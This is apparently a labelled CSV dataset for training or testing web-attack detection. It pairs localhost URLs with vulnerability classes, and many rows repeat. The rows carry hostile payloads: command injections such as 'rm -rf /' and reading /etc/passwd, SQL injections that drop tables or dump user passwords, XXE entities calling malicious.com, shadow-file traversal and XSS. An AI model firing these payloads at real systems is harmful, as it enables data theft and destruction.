URL,Vulnerability Type
http://127.0.0.1:5000/checkout?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/user?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/dashboard?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/profile?user=admin'--,SQL Injection
http://127.0.0.1:5000/checkout?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/product?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/admin?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/login?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/posts?load=config.php,File Inclusion
http://127.0.0.1:5000/posts?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/review?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/user?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/file?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/admin?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/user?user=admin'--,SQL Injection
http://127.0.0.1:5000/login?command=| netstat -an,Command Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/order?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/user?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/login?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/settings?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/messages?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/comments?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/upload?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/review?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/posts?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/user?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/checkout?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/cart?user=admin'--,SQL Injection
http://127.0.0.1:5000/product?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/profile?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/messages?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/file?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/upload?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/review?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/user?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/dashboard?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/report?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/profile?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/invoice?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/posts?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/dashboard?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/review?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/order?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/comments?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/file?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/admin?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/settings?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/invoice?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/comments?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/search?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/search?load=config.php,File Inclusion
http://127.0.0.1:5000/posts?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/comments?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/order?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/search?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/invoice?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/admin?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/login?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/admin?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/review?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/login?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/file?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/admin?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/login?file_id=1001,Insecure Direct Object Reference
"http://127.0.0.1:5000/invoice?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/download?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/search?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/upload?cmd=start notepad.exe,Command Injection
"http://127.0.0.1:5000/comments?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/checkout?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/report?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/login?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/dashboard?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/admin?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/checkout?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/download?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/posts?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/admin?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/cart?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/messages?command=| netstat -an,Command Injection
http://127.0.0.1:5000/comments?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/file?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/dashboard?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/product?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/review?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/admin?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/review?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/settings?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/file?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/posts?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/messages?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/product?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/invoice?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/posts?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/login?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/login?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/messages?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/file?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/file?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/download?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/settings?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/review?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/invoice?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/profile?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/login?path=/var/www/html/index.php,File Inclusion
"http://127.0.0.1:5000/messages?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/dashboard?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/cart?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/profile?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/file?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/upload?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/admin?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/dashboard?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/search?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/report?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?load=config.php,File Inclusion
http://127.0.0.1:5000/profile?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/login?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/comments?command=| netstat -an,Command Injection
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/comments?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/product?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/file?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/file?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/report?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/profile?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/upload?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/posts?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/search?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/invoice?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/invoice?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/posts?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/profile?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/messages?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/checkout?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/search?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/product?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/posts?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/report?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/comments?command=| netstat -an,Command Injection
http://127.0.0.1:5000/comments?document_id=789,Insecure Direct Object Reference
"http://127.0.0.1:5000/login?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/file?command=| netstat -an,Command Injection
http://127.0.0.1:5000/invoice?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/login?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/user?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/download?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/login?run=`whoami`,Command Injection
http://127.0.0.1:5000/admin?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/user?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/login?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/search?run=`whoami`,Command Injection
http://127.0.0.1:5000/comments?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/posts?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/download?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/comments?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/report?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/login?load=config.php,File Inclusion
http://127.0.0.1:5000/report?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/user?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/comments?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/checkout?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/user?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/search?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/order?user=admin'--,SQL Injection
http://127.0.0.1:5000/user?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/login?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/checkout?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/upload?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/profile?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?load=config.php,File Inclusion
http://127.0.0.1:5000/search?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/product?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/file?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/file?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/product?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/download?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/product?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/cart?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/upload?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/user?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/report?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/user?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/checkout?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/dashboard?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/profile?user=admin'--,SQL Injection
http://127.0.0.1:5000/admin?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/profile?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/profile?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/upload?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/login?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/admin?run=`whoami`,Command Injection
http://127.0.0.1:5000/admin?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/user?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/login?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/order?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/cart?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/comments?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/product?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/com_inj,Safe
"http://127.0.0.1:5000/order?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/product?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/review?load=config.php,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/search?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/profile?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/invoice?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/checkout?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/admin?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/download?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/download?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/upload?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/upload?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/login?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/comments?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/download?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/invoice?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/dashboard?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/user?user=admin'--,SQL Injection
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/user?command=| netstat -an,Command Injection
http://127.0.0.1:5000/checkout?load=config.php,File Inclusion
http://127.0.0.1:5000/user?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/report?command=| netstat -an,Command Injection
http://127.0.0.1:5000/user?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/checkout?command=| netstat -an,Command Injection
